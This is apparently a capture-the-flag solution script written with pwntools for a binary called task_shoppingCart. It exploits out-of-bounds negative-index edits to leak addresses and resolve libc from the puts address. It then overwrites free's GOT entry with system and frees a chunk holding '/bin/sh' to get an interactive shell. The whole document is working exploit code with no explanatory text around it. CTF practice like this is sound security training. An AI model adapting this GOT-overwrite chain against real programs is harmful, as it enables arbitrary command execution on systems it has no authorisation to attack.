from pwn import *
from LibcSearcher import LibcSearcher
from time import sleep 
# context.log_level="debug"

p = process("./task_shoppingCart")

def get_money(name):
	p.recvuntil("a rich man!\n")
	p.sendline("1")
	p.recvuntil("RMB or Dollar?\n")
	p.sendline(name)

def edit(idx , content = None ):
	p.recv()
	p.sendline("3")
	p.recvuntil("modify?\n")
	p.sendline(str(idx))
	sleep(0.1)
	p.recvuntil("modify ")
	data = p.recvuntil(" to?\n")[:-5]
	# print len(data)
	if content == None:
		return_data = u64(data[:6] + "\x00\x00")
		p.send(p64(return_data))
	else:
		p.send(content)
		return_data = data
	return return_data

def add(size , name):
	p.recvuntil("buy!\n")
	p.sendline("1")
	p.recvuntil("How long is your goods name?\n")
	p.sendline(str(size))
	p.recvuntil("What is your goods name?\n")
	p.send(name)

# fill money_list
for i in range(14):
	get_money("123")
# end shopping 1
p.recvuntil("man!\n")
p.sendline("3")
# get data_segment addr
data = edit(-47)
print hex(data)
# add /bin/sh
add(0xa8 , "/bin/sh\x00")
# get got addr
puts_offset = 0x48
free_offset = 0x50
mong_list_offset = 0x38
puts_got = data - puts_offset
free_got = data - free_offset
money_list = data + mong_list_offset
# get_puts_addr
edit(-18 , p64(money_list + 3*8))
edit(-17 , p64(puts_got))

puts_addr = edit(-38)
print "puts_got : " + hex(puts_got)
print "puts_addr : " + hex(puts_addr)
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
print "libc_base : " + hex(libc_base)
system_addr = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")

print "system : " + hex(system_addr)
# edit free to system
edit(-20 , p64(money_list + 0x8))
edit(-19 , p64(free_got))
edit(-40 , p64(system_addr)[:7]) # last byte \x00 fill by program
# *(good_list[index] + read( 0 , good_list[index] , 8)) = 0  
# delete to interactive
p.recvuntil("buy!\n")
p.sendline("2")
p.recvuntil("don't need?\n")
p.sendline("0")
p.recvuntil("eed it?\n")
p.interactive()
